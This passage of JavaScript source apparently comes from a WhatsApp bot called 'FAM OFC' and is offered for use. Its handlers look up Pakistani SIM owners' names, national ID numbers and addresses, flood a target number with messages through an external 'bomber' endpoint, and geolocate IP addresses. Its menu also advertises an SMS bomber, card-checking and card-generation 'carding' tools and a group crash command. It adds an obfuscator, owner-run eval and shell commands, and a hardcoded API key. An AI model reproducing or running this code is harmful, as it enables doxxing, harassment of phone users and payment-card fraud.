        m.reply("⚠ Error sending OTPs. Try again later.");
    }
}
break


case "simdata": {
    if (!text) {
        return m.reply('📌 Provide a phone number or CNIC!\nExample: simdata 03xxx');
    }

    try {
        const response = await axios.get(`https://fam-official.serv00.net/sim/api.php?num=${encodeURIComponent(text)}`);

        if (response.data && response.data.status === "success" && response.data.data.length > 0) {
            let formattedResponse = `📋 *\`𝐅𝐀𝐌 𝐎𝐅𝐂 𝐒𝐈𝐌 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄\`*\n\n`;

            // Loop through all results and format them
            response.data.data.forEach((userData, index) => {
                formattedResponse += `📌 *Record ${index + 1}:*\n`;
                formattedResponse += `🔹 *Name:* ${userData.Name}\n`;
                formattedResponse += `🔹 *Mobile:* ${userData.Mobile}\n`;
                formattedResponse += `🔹 *CNIC:* ${userData.CNIC}\n`;
                formattedResponse += `🔹 *Operator:* ${userData.Operator}\n`;
                formattedResponse += `🔹 *Address:* ${userData.Address.trim() || "Not Available"}\n`;
                formattedResponse += `━━━━━━━━━━━━━━━\n`;
            });

            m.reply(formattedResponse);
        } else {
            m.reply("⚠ No data found for the provided number. Please check the input and try again.");
        }
    } catch (error) {
        console.error("API Error:", error);
        m.reply("⚠ Error fetching data. Try again later.");
    }
}
break;




case "waspam": {
     if ( !isPremium ) return enviar("only used a premium user");

    if (!text) {
        return m.reply('📌 Provide a phone number!\nExample: 923xxx');
    }

    try {
        m.reply('✅ Sending...');
        
        const encodedNumber = encodeURIComponent(text);
        const response = await axios.get(`https://fam-official.serv00.net/sim/famwabomr.php?number=${encodedNumber}`);
        
        // Fix JSON response parsing
        let jsonResponses = response.data.split('}{').map((part, index, arr) => {
            return index === 0
                ? part + '}'
                : index === arr.length - 1
                ? '{' + part
                : '{' + part + '}';
        });

        let messages = jsonResponses.map(msg => JSON.parse(msg).message).join("\n");

        m.reply(messages);
    } catch (error) {
        console.error("API Error:", error);
        m.reply("⚠ Error fetching data. Try again later.");
    }
}
break




case "ai": {
    if (!text) {
        return m.reply("📌 *Hi Brother!* 🤖\nCan I help you?\n_Type:_ *.ai Your Question*");
    }

    try {
        const apiUrl = `https://fam-official.serv00.net/sim/famofcai.php?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
        
        console.log("API Response:", response.data); // Debugging - Check full response in the console

        if (response.data && response.data.success) {
            m.reply(`🤖 *AI Response:*\n\n${response.data.message}`);
        } else {
            m.reply(`⚠ *Error:* ${response.data.message || "AI response not available."}`);
        }
    } catch (error) {
        console.error("AI API Error:", error);
        m.reply("⚠ *Error fetching AI response.*\nPlease try again later.");
    }
}
break;



case "shorturl": {
    if (!text) {
        return m.reply('📌 Hi Brother :> ? _Type .shorturl_ *link*');
    }

    try {
        const response = await axios.get(`https://fam-official.serv00.net/sim/famurlshot.php?url=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.shortUrl) {
            m.reply(`🔗 Shortened URL: ${response.data.shortUrl}`);
        } else {
            m.reply("⚠ Failed to generate a short URL. Try again.");
        }
    } catch (error) {
        console.error("API Error:", error);
        m.reply("⚠ Error fetching data. Try again later.");
    }
}
break



case "getsc": {
    // Check if the sender is the owner
    if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) {
        return m.reply("⚠️ *Only the owner can use this command!*");
    }

    // Delete unnecessary files except creds.json
    let dir = await fs.readdirSync("./session");
    if (dir.length > 1) {
        let filesToDelete = dir.filter(file => file !== "creds.json");
        for (let file of filesToDelete) {
            await fs.unlinkSync(`./session/${file}`);
        }
    }

    await m.reply("⏳ *Processing bot script backup... Please wait.*");

    // Define backup name
    var backupName = `FAM-OFC_Bot`;

    // List all files and directories to include in backup
    const fileList = (await execSync("ls"))
        .toString()
        .split("\n")
        .filter(file => 
            file !== "node_modules" &&
            file !== "session" &&
            file !== "package-lock.json" &&
            file !== "yarn.lock" &&
            file !== ""
        );

    // Create ZIP archive of the bot script
    await execSync(`zip -r ${backupName}.zip ${fileList.join(" ")}`);

    // Send the ZIP file to the user
    await conn.sendMessage(m.sender, {
        document: await fs.readFileSync(`./${backupName}.zip`),
        fileName: `${backupName}.zip`,
        mimetype: "application/zip"
    }, { quoted: m });

    // Delete the ZIP file after sending
    await execSync(`rm -rf ${backupName}.zip`);

    // Notify the user if the script was sent in private chat
    if (m.chat !== m.sender) {
        return m.reply("📩 *The bot script has been sent to your private chat!*");
    }
}
break;
case "trackip": {
    if (!text) {
        return m.reply(`📌 *Usage:* ${prefix + command} 112.90.150.204`);
    }

    try {
        let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

        if (!res || !res.success) {
            throw new Error(`⚠ IP ${text} not found!`);
        }

        // Formatting the IP information response
        const formatIPInfo = (info) => {
            return `🎩 *𝐅𝐀𝐌 𝐎𝐅𝐂 - 𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑*\n\n` +
            `📍 *IP Address:* ${info.ip || 'N/A'}\n` +
            `✅ *Success:* ${info.success ? 'Yes' : 'No'}\n` +
            `🌍 *Type:* ${info.type || 'N/A'}\n` +
            `🗺️ *Continent:* ${info.continent || 'N/A'} (${info.continent_code || 'N/A'})\n` +
            `🏳️ *Country:* ${info.country || 'N/A'} (${info.country_code || 'N/A'})\n` +
            `🏙️ *Region:* ${info.region || 'N/A'} (${info.region_code || 'N/A'})\n` +
            `🌆 *City:* ${info.city || 'N/A'}\n` +
            `📌 *Latitude:* ${info.latitude || 'N/A'}\n` +
            `📌 *Longitude:* ${info.longitude || 'N/A'}\n` +
            `🌐 *Is EU:* ${info.is_eu ? 'Yes' : 'No'}\n` +
            `📮 *Postal Code:* ${info.postal || 'N/A'}\n` +
            `📞 *Calling Code:* +${info.calling_code || 'N/A'}\n` +
            `🏛️ *Capital:* ${info.capital || 'N/A'}\n` +
            `🗺️ *Borders:* ${Array.isArray(info.borders) && info.borders.length > 0 ? info.borders.join(", ") : 'None'}\n\n` +
            `🚀 *Connection Details:*\n` +
            `🔹 *ASN:* ${info.connection?.asn || 'N/A'}\n` +
            `🏢 *Organization:* ${info.connection?.org || 'N/A'}\n` +
            `📡 *ISP:* ${info.connection?.isp || 'N/A'}\n` +
            `🌎 *Domain:* ${info.connection?.domain || 'N/A'}\n\n` +
            `⏰ *Timezone:* ${info.timezone?.id || 'N/A'} (${info.timezone?.abbr || 'N/A'})\n` +
            `🕒 *Current Time:* ${info.timezone?.current_time || 'N/A'}\n\n` +
            `🚀 *Powered by FAM OFC*`;
        };

        // Send location pin if latitude & longitude exist
        if (res.latitude && res.longitude) {
            await conn.sendMessage(m.chat, {
                location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude }
            });
        }

        // Wait before sending IP details
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        await delay(2000);

        // Send IP details
        m.reply(formatIPInfo(res));

    } catch (error) {
        console.error("Error in 'trackip' case:", error);
        m.reply(`⚠ *Error:* Unable to retrieve data for IP ${text}`);
    }
}
break;

case 'addprem':
if (!isCreator(sender)) return enviar(" اس بورڈ کے مالک کے ساتھ رابطہ کریں\nwa.me/+923350963366 ")
if (!args[0]) return enviar(`Use ${prefix+command} number\nContoh ${prefix+command} 1849xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await conn.onWhatsApp(prrkek)
if (ceknya.length == 0) return enviar(`Enter a valid and registered number on WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
enviar(`oke تک رسائی دی گئی ہے۔ bot`)
break

case 'delprem':
if (!isCreator(sender)) return enviar(" اس بورڈ کے مالک کے ساتھ رابطہ کریں\nwa.me/+923350963366 ")
if (!args[0]) return enviar(`Use ${prefix+command} Nomor\nContoh ${prefix+command} 1849xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
enviar(`yah اب رسائی نہیں ہے`)
break


case "vdl": case "videodl": {
    if (args.length === 0) return m.reply("❌ *Please provide a video URL!*\n\nExample: `.vdl https://www.instagram.com/reel/...`");

    let videoUrl = args[0];
    let apiUrl = `https://api-xx-xi.hf.space/api/all-in-one?url=${encodeURIComponent(videoUrl)}`;

    try {
        let response = await fetch(apiUrl);
        let data = await response.json();

        // Debugging: Print API response in logs
        console.log("API Response:", JSON.stringify(data, null, 2));

        if (!data.success || !data.download_links) {
            return m.reply(`❌ *No downloadable video found for the given URL!*`);
        }

        // Handle different formats (Object vs. Array)
        let videoDownload;
        if (Array.isArray(data.download_links)) {
            videoDownload = data.download_links[0]?.url;
        } else if (typeof data.download_links === "object") {
            videoDownload = data.download_links.download; // Instagram format
        }

        if (!videoDownload) {
            return m.reply("❌ *No valid video download link found!*");
        }

        // Send initial loading message
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

        // Send video file
        await conn.sendMessage(m.chat, { 
            video: { url: videoDownload }, 
            caption: `🎬 *Platform:* ${data.platform.toUpperCase()}\n🔗 *Source:* ${videoUrl}\n\n🚀 *Powered by FAM OFC*`
        }, { quoted: m });

        // Send success reaction
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        console.error("Error Fetching Video:", error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        m.reply("❌ *Error downloading the video! Please try again later.*");
    }
}
break;




case "menu": {
    let [uptime, ping] = await Promise.all([runtime(process.uptime()), getPing()]);

    const textMenu = `  
╭━━━╮╱╱╱╱╱╱╱╱╱╱╭━╮
┃╭━━╯╱╱╱╱╱╱╱╱╱╱┃╭╯
┃╰━━┳━━┳╮╭╮╭━━┳╯╰┳━━╮
┃╭━━┫╭╮┃╰╯┃┃╭╮┣╮╭┫╭━╯
┃┃╱╱┃╭╮┃┃┃┃┃╰╯┃┃┃┃╰━╮
╰╯╱╱╰╯╰┻┻┻╯╰━━╯╰╯╰━━╯         
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┏━━━━━━━━━━━━━━┈ 
┣──=[ *\`[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ]\`* ] 
┆ 🤖 *Bot Name:*  ${global.namaBot}
┆ ⏳ *Uptime:* ${uptime}  
┆ ⚡ *Ping:* ${ping}  
┆ 👤 *User:* ${pushname}  
┆ 😎 *Status:* ${!isCreator(sender) ? "User ⭐" : "Developer ⭐"}
┆ 🎊 *Premium:* ${isPremium ? "✅" : "❎"}
┆ 🛠 *Type:* Tool  
┆ 🔢 *Version:* ${global.versionBot}  
┆ 🧑‍💻 *Dev:* ${global.namaDeveloper}  
┆ 🚀 *Powered by FAM OFC*  
└━━━━━━━━━━━━━━┈ ⳹
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
    `;

    // React Emojis
    const reactions = ['💖', '🖤', '💗', '😔', '💔'];
    await Promise.all(reactions.map(emoji => 
        conn.sendMessage(m.chat, { react: { text: emoji, key: m.key } })
    ));

    // Send Image with Buttons
    conn.sendMessage(m.chat, { 
        image: imageBuffer,  
        caption: textMenu,
        footer: "✨ FAM OFC MD ✨",
        buttons: [
            { buttonId: ".allmenu", buttonText: { displayText: '🌟 ALL MENU 🌟' } },
            { buttonId: ".developer", buttonText: { displayText: "🌟 DEVELOPER 🌟" } },
            { buttonId: ".lunaticseven", buttonText: { displayText: '🌟 LUNATIC-SEVEN 🌟' } }
        ],
        viewOnce: true
    }, { quoted: m });

    // Send Audio (Voice Note)
    conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;

case "allmenu": {
    let [uptime, ping] = await Promise.all([runtime(process.uptime()), getPing()]);

    const textAllMenu = `  
╭━━━╮╱╱╱╱╱╱╱╱╱╱╭━╮
┃╭━━╯╱╱╱╱╱╱╱╱╱╱┃╭╯
┃╰━━┳━━┳╮╭╮╭━━┳╯╰┳━━╮
┃╭━━┫╭╮┃╰╯┃┃╭╮┣╮╭┫╭━╯
┃┃╱╱┃╭╮┃┃┃┃┃╰╯┃┃┃┃╰━╮
╰╯╱╱╰╯╰┻┻┻╯╰━━╯╰╯╰━━╯         
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
 *🎊 F A M  V I P - M E N U 🎊*
   
┌── [ *\`Owner Menu\`* ]
│ ✇ *.clean*
│ ✇ *.getsc*
│ ✇ *.addprem*
│ ✇ *.delprem*  
│ ✇ *.addowner*
│ ✇ *removeowner*
│ ✇ *ai-mode* ( on/off )
└──────────────▪                   
┌── [ *\`Pak Sim Database\`* ]
│ ✇ *.simdata* ( number )
└──────────────▪
┌── [ *\`SMS Boomer\`* ]
│ ✇ *.waspam* ( number )
│ ✇ *.smsboomer* ( number 𝟏-𝟏𝟎𝟎 )
└──────────────▪
┌── [ *\`Carding Tools\`* ]
│ ✇ *.chkcc* ( Card ) 
│ ✇ *.gen* ( bin )
└──────────────▪
┌── [ *\`Tools\`* ]
│ ✇ *.ai* ( text )
│ ✇ *.tourl* ( reply img )
│ ✇ *.shorturl* ( url )
│ ✇ *.trackip*  ( 173.255.160.70 )
│ ✇ *.enc doc* ( reply js script )
│ ✇ *.dec doc* ( reply js script )
└──────────────▪
┌── [ *\`Bug Menu\`* ]
│ ✇ *.crt* ( group link )
└──────────────▪
┌── [ *\`All video downloader\`* ]
│ ✇ *.vdl* ( link )
└──────────────▪
    `;

    // React Emojis
    const reactions = ['💖', '🖤', '💗', '😔', '💔'];
    await Promise.all(reactions.map(emoji => 
        conn.sendMessage(m.chat, { react: { text: emoji, key: m.key } })
    ));

    // Send Image with Buttons
    conn.sendMessage(m.chat, { 
        image: imageBuffer,  
        caption: textAllMenu,
        footer: "✨ FAM OFC MD ✨",
        buttons: [
            { buttonId: ".developer", buttonText: { displayText: "🌟 DEVELOPER 🌟" } },
            { buttonId: ".lunaticseven", buttonText: { displayText: '🌟 LUNATIC-SEVEN 🌟' } }
        ],
        viewOnce: true
    }, { quoted: m });

    // Send Audio (Voice Note)
    
}
break;


case 'clearchat':
if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");

for (let i = 0; i < 2; i++) {
if (!q) return enviar("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
await conn.sendMessage(numi, {
text: "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
})
}
break;

case 'ownernoworking': {
    await conn.sendMessage(m.chat, { react: { text: "💖", key: m.key } });

    let ownerNumber = "https://wa.me/+923350963366"; // Your WhatsApp link
    let ownerName = "Faheem - FAM OFC"; // Your name

    let buttons = [
        { name: "cta_url", buttonParamsJson: `{"display_text":"WhatsApp","url":"${ownerNumber}"}` },
        { name: "cta_url", buttonParamsJson: `{"display_text":"YouTube","url":"https://youtube.com/@famofch4k3r-"}` },
        { name: "cta_url", buttonParamsJson: `{"display_text":"Telegram","url":"t.me/faheemxyz"}` },
        { name: "cta_url", buttonParamsJson: `{"display_text":"GitHub","url":"https://github.com/Faheemxyz/"}` },
        { name: "cta_url", buttonParamsJson: `{"display_text":"Instagram","url":"https://www.instagram.com/fam_ofc1?igsh=MXgzeG55bjE0emtwZg=="}` },
        { name: "cta_url", buttonParamsJson: `{"display_text":"WhatsApp Channel","url":"https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C"}` }
    ];

    let msg = {
        interactiveMessage: {
            body: { text: `👑 *Hello ${pushname}*\n\n📌 This is my owner. Don't spam!` },
            carouselMessage: {
                cards: buttons.map(btn => ({
                    header: { imageMessage: { jpegThumbnail: imageBuffer }, hasMediaAttachment: true },
                    body: { text: ownerName },
                    nativeFlowMessage: { buttons: [btn] }
                })),
                messageVersion: 1
            }
        }
    };

    await conn.relayMessage(m.chat, { viewOnceMessage: { message: msg } }, { messageId: m.key.id });
}
break;


/**
  * famofc
  * don't forget to follow
  * https://whatsapp.com/channel/0029Vb30zLXLo4hWVPChF41q
*/


//===========TOOLS MENU=========//
case 'tiktok': case 'tt': {
  if (!text) return enviar(`Contoh: ${prefix + command} link`);
  enviar("Mohon Tunggu Sebentar...")
 const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER ]*
 *Video dari* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_
*Likes*: _${data.stats.likeCount ?? ''}_
*Comments*: _${data.stats.commentCount ?? ''}_
*Shares*: _${data.stats.shareCount ?? ''}_
*Plays*: _${data.stats.playCount ?? ''}_
*Saves*: _${data.stats.saveCount ?? ''}_
\`⏤͟͟͞͞ Downloader By ${global.namaOwner}\`
`;
 conn.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
}
break

case 'enc':  {

        const usage = `Usage Example:
${prefix + command} doc (Reply to a document)`;

        let text;
        if (args.length >= 1) {
            text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
            text = m.quoted.text;
        } else {
            return enviar(usage);
        }
        
        try {
            let code;
            if (text === 'doc' && m.quoted && m.quoted.mtype === 'extendedTextMessage') {
                let docBuffer;
                if (m.quoted.mimetype) {
                    docBuffer = await m.quoted.download();
                }
                code = docBuffer.toString('utf-8');
            } else {
                code = text;
            }

const optionsObf6 = {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難FAM_OFC素晴座素晴難" + 
            "素晴座素晴難FAM_OFC素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

    renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};


        const options = {
            target: "node",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.5,
  deadCode: 0.25,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  preserveFunctionLength: true,
  identifierGenerator: function () {
                return "FAM_OFC" + Math.random().toString(36).substring(7);
            },
        };

            const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6);

            const filePath = './enc_by_famofc.js';
            fs.writeFileSync(filePath, obfuscatedCode);

            await conn.sendMessage(m.chat, {
                document: {
                    url: filePath
                },
                mimetype: 'application/javascript',
                fileName: 'Encrypted By famofc.js'
            }, { quoted: m });

        } catch (error) {
            const errorMessage = `There is an error: ${error.message}`;
            await enviar(errorMessage);
        }
}
break;
case 'dec': case 'decrypt': {
    if (!isCreator(sender)) return m.reply("❌ Only the Owner can use this command!");

    const { webcrack } = await import('webcrack');
    const usage = `📌 *Usage Example:*\n`
        + `- *${prefix + command}* (Input text or reply to encrypted text)\n`
        + `- *${prefix + command} doc* (Reply to an encrypted document)`;

    let text;
    if (args.length >= 1) {
        text = args.join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return m.reply(usage);
    }

    try {
        let message;
        let filePath = './dec_by_FAMOFC.js';

        if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
            let docBuffer;
            if (m.quoted.mimetype) {
                docBuffer = await m.quoted.download();
            }
            message = await webcrack(docBuffer.toString('utf-8'));
        } else {
            message = await webcrack(text);
        }

        fs.writeFileSync(filePath, message.code);

        await conn.sendMessage(m.chat, {
            document: fs.readFileSync(filePath),
            mimetype: 'application/javascript',
            fileName: 'Decrypted_By_FAMOFC.js'
        }, { quoted: m });

        // Delete the file after sending
        fs.unlinkSync(filePath);
    } catch (error) {
        m.reply(`⚠ *Error Decrypting:* ${error.message}`);
    }
}
break;


case 'splay': {
 const axios = require("axios");
 if (!text) return m.reply('Masukkan Judul Contoh\nContoh `Kewer Kewer`');

 await enviar("Mohon Tunggu Sebentar...");

 try {
 // URL API untuk pencarian lagu
 const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
 const searchData = (await axios.get(searchApiUrl)).data;
 
 // Pilih hasil pertama dari data pencarian
 const data = searchData[0];
 if (!data) return enviar("Lagu tidak ditemukan.");

 // Teks yang akan dikirimkan
 const tekswait = `*𝐒𝐩𝐨𝐭𝐢𝐟𝐲 𝐩𝐥𝐚𝐲𝐞𝐫*

- *Judul:* ${data.title}
- *Artis:* ${data.artist}
- *URL:* ${data.url}`;

 // Mengirim pesan informasi lagu
 await conn.sendMessage(m.chat, { 
 text: `${tekswait}`, 
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: { 
 showAdAttribution: true,
 title:`${data.title}`,
 body:"SPOTIFY SEARCH & DOWNLOAD",
 thumbnailUrl: data.thumbnail,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 } 
 }, { quoted: m });

 // URL API untuk download lagu
 const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
 // Mendapatkan data dari API
 let response = await fetch(downloadApiUrl);
 
 // Memastikan respon adalah tipe audio
 if (response.headers.get("content-type") === "audio/mpeg") {
 // Mengirim audio melalui WhatsApp
 await conn.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
 } else {
 m.reply("Gagal mendapatkan file audio.");
 }
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat mengambil file audio.");
 }
}
break
case "tourl": {
const axios = require("axios");
const FormData = require("form-data");
const fs = require("fs");
    if (!m.quoted || !m.quoted.mimetype || !m.quoted.mimetype.startsWith("image/")) {
        return m.reply("📌 براہ کرم کسی تصویر پر ریپلائے کریں تاکہ اسے لنک میں تبدیل کیا جا سکے!");
    }

    let media = await m.quoted.download();
    let tempFilePath = "./fam_ofc.jpg"; // Temporary file path

    fs.writeFileSync(tempFilePath, media); // Save the buffer as an image file

    let formData = new FormData();
    formData.append("image", fs.createReadStream(tempFilePath)); // Use createReadStream

    try {
        let response = await axios.post(
            "https://api.imgbb.com/1/upload?key=1fe5c36a643f15d1e5478c716f876a4c",
            formData,
            { headers: { ...formData.getHeaders() } }
        );

        fs.unlinkSync(tempFilePath); // Delete temp file after upload

        let data = response.data;
        if (data.success) {
            let imageUrl = data.data.url;
            m.reply(`✅ **Image Uploaded Successfully!**\n🔗 **URL:** ${imageUrl}`);
        } else {
            m.reply("⚠ تصویر کو لنک میں تبدیل کرنے میں خرابی ہوئی، دوبارہ کوشش کریں!");
        }
    } catch (error) {
        console.error("API Error:", error);
        m.reply("⚠ API سے کنکشن ناکام ہوگیا، دوبارہ کوشش کریں!");
    }
}
break
case "kick": case "kik": {
if (!m.isGroup) return enviar("Only Group")
if (!isCreator(sender) && !m.isAdmins) return enviar("Only Owner!")
if (!m.isBotAdmins) return enviar("Blum Admin Kontol")
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break
default:
if (budy.startsWith('=>')) {
if (!isCreator(sender)) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == conn) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}


if (budy.startsWith('>')) {
if (!isCreator(sender)) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator(sender)) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

}
} catch (err) {
console.log(util.format(err))
}
}

const getAIResponse = async (userText, m) => {
    try {
        const apiUrl = `https://fam-official.serv00.net/sim/famofcai.php?text=${encodeURIComponent(userText)}`;
        const response = await axios.get(apiUrl);

        console.log("AI API Response:", response.data); // Debugging

        if (response.data && response.data.success) {
            return m.reply(`🤖 *AI Response:*\n\n${response.data.message}`);
        } else {
            return m.reply(`⚠ *Error:* ${response.data.message || "AI response not available."}`);
        }
    } catch (error) {
        console.error("AI API Error:", error);
        return m.reply("⚠ *Error fetching AI response.*\nPlease try again later.");
    }
};


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
